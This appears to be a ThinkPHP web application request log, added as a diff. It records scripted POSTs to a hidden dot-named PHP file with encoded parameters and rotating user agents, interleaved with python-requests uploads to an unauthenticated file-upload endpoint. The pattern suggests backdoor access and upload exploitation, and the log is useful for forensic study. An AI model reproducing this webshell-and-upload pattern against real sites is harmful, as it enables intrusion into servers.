+[ 2018-07-05T23:52:28+08:00 ] 172.17.0.1 POST //.928e14c9854929ed80a1be176de90b9b.php
+[ info ] 127.0.0.1:80//.928e14c9854929ed80a1be176de90b9b.php [运行时间：0.060493s][吞吐率：16.53req/s] [内存消耗：303.66kb] [文件加载：33]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.928e14c9854929ed80a1be176de90b9b.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1:80',
+  'accept-encoding' => 'identity',
+  'content-length' => '75',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 630) like Gecko',
+)
+[ info ] [ PARAM ] array (
+  'a' => 'p3ymqTIg',
+  'b' => 'MJAbolObMJkfZSpjpwSxBj==',
+  'hash' => '9b0910f56ed3b758c7f382ae2fe7b52f',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:52:28+08:00 ] 172.17.0.1 POST /index.php/user/upFiles/upload
+[ info ] 127.0.0.1/index.php/user/upFiles/upload [运行时间：0.053140s][吞吐率：18.82req/s] [内存消耗：596.98kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'upFiles',
+    2 => 'upload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.18.4',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-length' => '176',
+  'content-type' => 'multipart/form-data; boundary=0fa9fe247c304bef831055a89157a7fc',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\UpFiles->upload[ /var/www/html/app/user/controller/UpFiles.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000404s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_users` [ RunTime:0.000685s ]
+[ sql ] [ SQL ] SELECT `u`.*,`ul`.`level_name` FROM `clt_users` `u` LEFT JOIN `clt_user_level` `ul` ON `u`.`level`=`ul`.`level_id` WHERE  `u`.`id` IS NULL LIMIT 1 [ RunTime:0.000245s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:52:30+08:00 ] 172.17.0.1 POST //.928e14c9854929ed80a1be176de90b9b.php
+[ info ] 127.0.0.1:80//.928e14c9854929ed80a1be176de90b9b.php [运行时间：0.040710s][吞吐率：24.56req/s] [内存消耗：303.34kb] [文件加载：33]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.928e14c9854929ed80a1be176de90b9b.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1:80',
+  'accept-encoding' => 'identity',
+  'content-length' => '75',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Uzbl (Webkit 1.3) (Linux i686 [i686])',
+)
+[ info ] [ PARAM ] array (
+  'a' => 'p3ymqTIg',
+  'b' => 'MJAbolObMJkfZSpjpwSxBj==',
+  'hash' => '9b0910f56ed3b758c7f382ae2fe7b52f',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:52:31+08:00 ] 172.17.0.1 POST /index.php/user/upFiles/upload
+[ info ] 127.0.0.1/index.php/user/upFiles/upload [运行时间：0.070279s][吞吐率：14.23req/s] [内存消耗：597.04kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'upFiles',
+    2 => 'upload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.18.4',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-length' => '176',
+  'content-type' => 'multipart/form-data; boundary=7368cb1b3a864d87992940b6a7805639',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\UpFiles->upload[ /var/www/html/app/user/controller/UpFiles.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001680s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_users` [ RunTime:0.000849s ]
+[ sql ] [ SQL ] SELECT `u`.*,`ul`.`level_name` FROM `clt_users` `u` LEFT JOIN `clt_user_level` `ul` ON `u`.`level`=`ul`.`level_id` WHERE  `u`.`id` IS NULL LIMIT 1 [ RunTime:0.000361s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:52:33+08:00 ] 172.17.0.1 POST //.928e14c9854929ed80a1be176de90b9b.php
+[ info ] 127.0.0.1:80//.928e14c9854929ed80a1be176de90b9b.php [运行时间：0.049868s][吞吐率：20.05req/s] [内存消耗：303.50kb] [文件加载：33]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.928e14c9854929ed80a1be176de90b9b.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1:80',
+  'accept-encoding' => 'identity',
+  'content-length' => '75',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
+)
+[ info ] [ PARAM ] array (
+  'a' => 'p3ymqTIg',
+  'b' => 'MJAbolObMJkfZSpjpwSxBj==',
+  'hash' => '9b0910f56ed3b758c7f382ae2fe7b52f',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:52:33+08:00 ] 172.17.0.1 POST /index.php/user/upFiles/upload
+[ info ] 127.0.0.1/index.php/user/upFiles/upload [运行时间：0.036187s][吞吐率：27.63req/s] [内存消耗：596.98kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'upFiles',
+    2 => 'upload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.18.4',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-length' => '176',
+  'content-type' => 'multipart/form-data; boundary=87c14d54ed194ead821a1e7df0e8c4bf',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\UpFiles->upload[ /var/www/html/app/user/controller/UpFiles.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000332s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_users` [ RunTime:0.000668s ]
+[ sql ] [ SQL ] SELECT `u`.*,`ul`.`level_name` FROM `clt_users` `u` LEFT JOIN `clt_user_level` `ul` ON `u`.`level`=`ul`.`level_id` WHERE  `u`.`id` IS NULL LIMIT 1 [ RunTime:0.000219s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:52:36+08:00 ] 172.17.0.1 POST //.928e14c9854929ed80a1be176de90b9b.php
+[ info ] 127.0.0.1:80//.928e14c9854929ed80a1be176de90b9b.php [运行时间：0.068460s][吞吐率：14.61req/s] [内存消耗：303.93kb] [文件加载：33]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.928e14c9854929ed80a1be176de90b9b.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1:80',
+  'accept-encoding' => 'identity',
+  'content-length' => '75',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (SymbianOS 9.4; Series60/5.0 NokiaN97-1/10.0.012; Profile/MIDP-2.1 Configuration/CLDC-1.1; en-us) AppleWebKit/525 (KHTML, like Gecko) WicKed/7.1.12344',
+)
+[ info ] [ PARAM ] array (
+  'a' => 'p3ymqTIg',
+  'b' => 'MJAbolObMJkfZSpjpwSxBj==',
+  'hash' => '9b0910f56ed3b758c7f382ae2fe7b52f',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:52:36+08:00 ] 172.17.0.1 POST /index.php/user/upFiles/upload
+[ info ] 127.0.0.1/index.php/user/upFiles/upload [运行时间：0.058153s][吞吐率：17.20req/s] [内存消耗：596.98kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'upFiles',
+    2 => 'upload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.18.4',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-length' => '176',
+  'content-type' => 'multipart/form-data; boundary=51d634acd1084f9fab1769c6e3a244d5',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\UpFiles->upload[ /var/www/html/app/user/controller/UpFiles.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000526s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_users` [ RunTime:0.000931s ]
+[ sql ] [ SQL ] SELECT `u`.*,`ul`.`level_name` FROM `clt_users` `u` LEFT JOIN `clt_user_level` `ul` ON `u`.`level`=`ul`.`level_id` WHERE  `u`.`id` IS NULL LIMIT 1 [ RunTime:0.000333s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:52:38+08:00 ] 172.17.0.1 POST //.928e14c9854929ed80a1be176de90b9b.php
+[ info ] 127.0.0.1:80//.928e14c9854929ed80a1be176de90b9b.php [运行时间：0.038617s][吞吐率：25.90req/s] [内存消耗：303.51kb] [文件加载：33]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.928e14c9854929ed80a1be176de90b9b.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1:80',
+  'accept-encoding' => 'identity',
+  'content-length' => '75',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (OS/2; Warp 4.5; rv:31.0) Gecko/20100101 Firefox/31.0 SeaMonkey/2.28',
+)
+[ info ] [ PARAM ] array (
+  'a' => 'p3ymqTIg',
+  'b' => 'MJAbolObMJkfZSpjpwSxBj==',
+  'hash' => '9b0910f56ed3b758c7f382ae2fe7b52f',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:52:38+08:00 ] 172.17.0.1 POST /index.php/user/upFiles/upload
+[ info ] 127.0.0.1/index.php/user/upFiles/upload [运行时间：0.044436s][吞吐率：22.50req/s] [内存消耗：596.98kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'upFiles',
+    2 => 'upload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.18.4',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-length' => '176',
+  'content-type' => 'multipart/form-data; boundary=b2c8ba3a282a4f9688088ee1fddfb8e0',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\UpFiles->upload[ /var/www/html/app/user/controller/UpFiles.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000498s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_users` [ RunTime:0.001015s ]
+[ sql ] [ SQL ] SELECT `u`.*,`ul`.`level_name` FROM `clt_users` `u` LEFT JOIN `clt_user_level` `ul` ON `u`.`level`=`ul`.`level_id` WHERE  `u`.`id` IS NULL LIMIT 1 [ RunTime:0.000487s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:52:40+08:00 ] 172.17.0.1 POST //.928e14c9854929ed80a1be176de90b9b.php
+[ info ] 127.0.0.1:80//.928e14c9854929ed80a1be176de90b9b.php [运行时间：0.064978s][吞吐率：15.39req/s] [内存消耗：303.43kb] [文件加载：33]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.928e14c9854929ed80a1be176de90b9b.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1:80',
+  'accept-encoding' => 'identity',
+  'content-length' => '75',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
+)
+[ info ] [ PARAM ] array (
+  'a' => 'p3ymqTIg',
+  'b' => 'MJAbolObMJkfZSpjpwSxBj==',
+  'hash' => '9b0910f56ed3b758c7f382ae2fe7b52f',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:52:40+08:00 ] 172.17.0.1 POST /index.php/user/upFiles/upload
+[ info ] 127.0.0.1/index.php/user/upFiles/upload [运行时间：0.060749s][吞吐率：16.46req/s] [内存消耗：596.98kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'upFiles',
+    2 => 'upload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.18.4',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-length' => '176',
+  'content-type' => 'multipart/form-data; boundary=c535c05a2edf4717bd655aabdcf57c59',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\UpFiles->upload[ /var/www/html/app/user/controller/UpFiles.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000929s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_users` [ RunTime:0.001379s ]
+[ sql ] [ SQL ] SELECT `u`.*,`ul`.`level_name` FROM `clt_users` `u` LEFT JOIN `clt_user_level` `ul` ON `u`.`level`=`ul`.`level_id` WHERE  `u`.`id` IS NULL LIMIT 1 [ RunTime:0.000576s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:52:42+08:00 ] 172.17.0.1 POST //.928e14c9854929ed80a1be176de90b9b.php
+[ info ] 127.0.0.1:80//.928e14c9854929ed80a1be176de90b9b.php [运行时间：0.042072s][吞吐率：23.77req/s] [内存消耗：303.75kb] [文件加载：33]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.928e14c9854929ed80a1be176de90b9b.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1:80',
+  'accept-encoding' => 'identity',
+  'content-length' => '75',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
+)
+[ info ] [ PARAM ] array (
+  'a' => 'p3ymqTIg',
+  'b' => 'MJAbolObMJkfZSpjpwSxBj==',
+  'hash' => '9b0910f56ed3b758c7f382ae2fe7b52f',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:52:42+08:00 ] 172.17.0.1 POST /index.php/user/upFiles/upload
+[ info ] 127.0.0.1/index.php/user/upFiles/upload [运行时间：0.057735s][吞吐率：17.32req/s] [内存消耗：596.98kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'upFiles',
+    2 => 'upload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.18.4',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-length' => '176',
+  'content-type' => 'multipart/form-data; boundary=ccd002e3697442a688a95758ddeb5e85',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\UpFiles->upload[ /var/www/html/app/user/controller/UpFiles.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.001507s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_users` [ RunTime:0.000903s ]
+[ sql ] [ SQL ] SELECT `u`.*,`ul`.`level_name` FROM `clt_users` `u` LEFT JOIN `clt_user_level` `ul` ON `u`.`level`=`ul`.`level_id` WHERE  `u`.`id` IS NULL LIMIT 1 [ RunTime:0.000319s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:52:44+08:00 ] 172.17.0.1 POST //.928e14c9854929ed80a1be176de90b9b.php
+[ info ] 127.0.0.1:80//.928e14c9854929ed80a1be176de90b9b.php [运行时间：0.050443s][吞吐率：19.82req/s] [内存消耗：303.67kb] [文件加载：33]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.928e14c9854929ed80a1be176de90b9b.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1:80',
+  'accept-encoding' => 'identity',
+  'content-length' => '75',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2869.0 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+  'a' => 'p3ymqTIg',
+  'b' => 'MJAbolObMJkfZSpjpwSxBj==',
+  'hash' => '9b0910f56ed3b758c7f382ae2fe7b52f',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:52:44+08:00 ] 172.17.0.1 POST /index.php/user/upFiles/upload
+[ info ] 127.0.0.1/index.php/user/upFiles/upload [运行时间：0.049398s][吞吐率：20.24req/s] [内存消耗：596.98kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'upFiles',
+    2 => 'upload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.18.4',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-length' => '176',
+  'content-type' => 'multipart/form-data; boundary=52bfe52888c343dbafd362cc78ab0410',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\UpFiles->upload[ /var/www/html/app/user/controller/UpFiles.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000478s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_users` [ RunTime:0.000818s ]
+[ sql ] [ SQL ] SELECT `u`.*,`ul`.`level_name` FROM `clt_users` `u` LEFT JOIN `clt_user_level` `ul` ON `u`.`level`=`ul`.`level_id` WHERE  `u`.`id` IS NULL LIMIT 1 [ RunTime:0.000315s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:54:05+08:00 ] 172.17.0.1 POST //.928e14c9854929ed80a1be176de90b9b.php
+[ info ] 127.0.0.1:80//.928e14c9854929ed80a1be176de90b9b.php [运行时间：0.059858s][吞吐率：16.71req/s] [内存消耗：303.70kb] [文件加载：33]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.928e14c9854929ed80a1be176de90b9b.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1:80',
+  'accept-encoding' => 'identity',
+  'content-length' => '75',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36',
+)
+[ info ] [ PARAM ] array (
+  'a' => 'p3ymqTIg',
+  'b' => 'MJAbolObMJkfZSpjpwSxBj==',
+  'hash' => '9b0910f56ed3b758c7f382ae2fe7b52f',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:54:05+08:00 ] 172.17.0.1 POST /index.php/user/upFiles/upload
+[ info ] 127.0.0.1/index.php/user/upFiles/upload [运行时间：0.058652s][吞吐率：17.05req/s] [内存消耗：596.98kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'upFiles',
+    2 => 'upload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.18.4',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-length' => '191',
+  'content-type' => 'multipart/form-data; boundary=d34f112186694e2bbcd24ebbd7ad76aa',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\UpFiles->upload[ /var/www/html/app/user/controller/UpFiles.php ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000922s ] mysql:host=127.0.0.1;port=3306;dbname=cltphp51_db;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `clt_users` [ RunTime:0.000709s ]
+[ sql ] [ SQL ] SELECT `u`.*,`ul`.`level_name` FROM `clt_users` `u` LEFT JOIN `clt_user_level` `ul` ON `u`.`level`=`ul`.`level_id` WHERE  `u`.`id` IS NULL LIMIT 1 [ RunTime:0.000237s ]
+---------------------------------------------------------------
+[ 2018-07-05T23:54:07+08:00 ] 172.17.0.1 POST //.928e14c9854929ed80a1be176de90b9b.php
+[ info ] 127.0.0.1:80//.928e14c9854929ed80a1be176de90b9b.php [运行时间：0.037925s][吞吐率：26.37req/s] [内存消耗：303.73kb] [文件加载：33]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.928e14c9854929ed80a1be176de90b9b.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1:80',
+  'accept-encoding' => 'identity',
+  'content-length' => '75',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.8 (KHTML, like Gecko) Beamrise/17.2.0.9 Chrome/17.0.939.0 Safari/535.8',
+)
+[ info ] [ PARAM ] array (
+  'a' => 'p3ymqTIg',
+  'b' => 'MJAbolObMJkfZSpjpwSxBj==',
+  'hash' => '9b0910f56ed3b758c7f382ae2fe7b52f',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:54:18+08:00 ] 172.17.0.1 POST //.928e14c9854929ed80a1be176de90b9b.php
+[ info ] 127.0.0.1:80//.928e14c9854929ed80a1be176de90b9b.php [运行时间：0.040092s][吞吐率：24.94req/s] [内存消耗：303.95kb] [文件加载：33]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '.928e14c9854929ed80a1be176de90b9b.php',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1:80',
+  'accept-encoding' => 'identity',
+  'content-length' => '75',
+  'content-type' => 'application/x-www-form-urlencoded',
+  'user-agent' => 'Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95/10.0.018; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413 UP.Link/6.3.0.0.0',
+)
+[ info ] [ PARAM ] array (
+  'a' => 'p3ymqTIg',
+  'b' => 'MJAbolObMJkfZSpjpwSxBj==',
+  'hash' => '9b0910f56ed3b758c7f382ae2fe7b52f',
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2018-07-05T23:54:18+08:00 ] 172.17.0.1 POST /index.php/user/upFiles/upload
+[ info ] 127.0.0.1/index.php/user/upFiles/upload [运行时间：0.064014s][吞吐率：15.62req/s] [内存消耗：596.98kb] [文件加载：48]
+[ info ] [ LANG ] /var/www/html/think/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'user',
+    1 => 'upFiles',
+    2 => 'upload',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '127.0.0.1',
+  'connection' => 'keep-alive',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => '*/*',
+  'user-agent' => 'python-requests/2.18.4',
+  'x-requested-with' => 'XMLHttpRequest',
+  'content-length' => '191',
+  'content-type' => 'multipart/form-data; boundary=709dc38f2cf34742a571941bd20b47b5',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ DB ] INIT mysql
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ RUN ] app\user\controller\UpFiles->upload[ /var/www/html/app/user/controller/UpFiles.php ]
